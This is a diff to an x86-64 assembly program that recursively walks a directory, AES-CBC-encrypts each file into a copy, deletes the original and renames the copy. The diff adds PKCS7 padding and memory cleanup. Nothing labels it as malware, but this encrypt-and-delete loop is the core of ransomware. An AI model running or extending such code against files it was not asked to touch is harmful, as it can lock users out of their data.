@@ -1,9 +1,6 @@
-; %include "str_funcs.asm"
-
 %include "file.asm"
 %include "dir.asm"
 %include "aes.asm"
-; %include "str.asm"
 
 extern printf
 extern strcmp
@@ -12,6 +9,8 @@ extern strncpy
 extern sprintf
 extern malloc
 extern free 
+extern memset
+extern bzero
 extern fstat
 
 DIRENT_BUFF_SZ        equ 4096
@@ -69,7 +68,6 @@ section   .text
 main:
         push    rbp
         mov     rbp, rsp
-        ; jmp     __Dec
         
         cmp     rdi, 0x01
         je      _start_op
@@ -82,13 +80,12 @@ main:
         cmp     rax, 0x00
         jne     _start_op
 
-__Dec:        ; decrypt
+_Dec:
         mov     BYTE[op], OP_DEC
         mov     QWORD[opFunction], AES_CBC_decrypt_buffer
         mov     QWORD[renameFunction], original_filename
 
 _start_op:
-        call    init_aes_ctx
        
         push    dirpath
         call    get_dir_files_rec
@@ -194,6 +191,8 @@ read_next_dirent:
         jmp     _next_offset
 
 _read_next_file:
+        call    init_aes_ctx
+       
         ;; open original file in readonly 
         push    0x00                                    ; no need for permissions
         push    O_RDONLY                                ; open mode
@@ -204,7 +203,7 @@ _read_next_file:
         jle     openfile_failed
         mov     QWORD[file_fd], rax
 
-        push    QWORD [rbp - filePath]
+        push    QWORD [rbp - filePath]          
         call    [renameFunction]
 
         push    rax
@@ -213,11 +212,8 @@ _read_next_file:
         mov     rsi, rax
         mov     rax, 0x00
         call    printf
-        ;cmp    rax, 0x00
-        ; ...
 
         pop     rax
-
         ; create new file
         push    rax
         call    create_file
@@ -227,51 +223,18 @@ _read_next_file:
 
         mov     QWORD[file_copy_fd], rax
         
-        push    QWORD[file_fd]
-        call    file_size
-
         cmp     rax, 0x00
         jle     _next_offset
 
-        mov     QWORD[rbp - fileSize], rax
-        lea     r9, [rbp - fileSize]
-
-        cmp     byte[op], OP_DEC
-        je      _read_file_size
-
-        ; save file size
-        
-
-        push    0x08
-        push    r9
-        push    QWORD[file_copy_fd]
-        call    write_file
-        
-
-        mov     rdi, fmtHex
-        mov     rsi, QWORD[r9]
-        mov     rax, 0x00
-        call    printf
-
         xor     r10, r10
         
-        jmp     _read_loop
-
-
-_read_file_size:
-        push    0x08
-        push    r9
-        push    QWORD[file_fd]
-        call    read_file
-
-        mov     rdi, fmtHex
-        mov     rsi, QWORD[r9]
-        mov     rax, 0x00
-        call    printf
-
+        mov     rdi, fileBuffer
+        mov     rsi, BUFF_SZ
+        call    bzero 
 
 _read_loop:
-        push    BUFF_SZ
+
+        push    BUFF_SZ - 0x10
         push    fileBuffer
         push    QWORD[file_fd]
         call    read_file
@@ -280,31 +243,71 @@ _read_loop:
         jle      _close_files
 
         add     r10, rax
-        
         push    rax
-        push    r10
-        
+        cmp     byte[op], OP_DEC
+        je      _write_copy
+
+        ; check if its a multiple of 16
+        ; same as r9 % 16
+        mov     r9, rax
+        and     r9, 0xF
+
+        cmp     r9, 0x00
+        je      _padd_new_block
+
+        mov     r8, 0x10
+        xchg    r9, r8
+        sub     r9, r8
+
+        lea     rdi, [fileBuffer + rax]
+        add     rax, r9
+        push    rax
+
+        mov     rsi, r9
+        mov     rdx, r9
+        call    memset
+
+        jmp     _write_copy
+
+_padd_new_block:
+        ; add a new 16 bytes block
+        lea     rdi, [fileBuffer + rax]
+        add     rax, 0x10
+        push    rax
+
+        mov     rsi, 0x10
+        mov     rdx, 0x10
+        call    memset
+
+
+
+_write_copy:
+
+        pop     rax
+        push    rax
         ; encrypt data
-        mov     rdx, rax
-        mov     rsi, fileBuffer
         mov     rdi, aesCtx
+        mov     rsi, fileBuffer
+        mov     rdx, rax
         call    [opFunction]
 
-        pop     r10
         pop     rax
 
-        mov     r12, rax
+        cmp     byte[op], OP_ENC
+        je      _write_data
 
+        ; handle pkcs7 padding when decrypting
+        xor     rcx, rcx
+        mov     cl, byte[fileBuffer + rax - 1]
+        sub     rax, rcx
+        
+_write_data:
         push    rax
         push    fileBuffer      ; buffer
         push    QWORD[file_copy_fd]             ; new file fd
         call    write_file
 
-        ; cmp     r10, QWORD[rbp - fileSize]
         jmp      _read_loop
-
-        ; cmp     r12, 0x00
-        ; jg      _read_loop
 
 _close_files:
         
@@ -314,6 +317,10 @@ _close_files:
 
         push    QWORD[rbp - filePath]
         call    delete_file
+
+        ; free filePath memory
+        mov     rdi, QWORD[rbp - filePath]
+        call    free
 
         ; close the encrypted file
         push    QWORD[file_copy_fd]
@@ -330,6 +337,13 @@ _next_offset:
         jl      read_next_dirent
         
 _ret_get_dir_files:
+
+        ; free dirent buffer
+        mov     rdi, QWORD[rbp - bufferPtr]
+        call    free
+
+
+
         leave
         ret
 
@@ -350,7 +364,6 @@ readfile_failed:
         mov     rcx, rax
         mov     rax, 0x00
         call    printf
-
         jmp     exit_0
 
 exit_0:
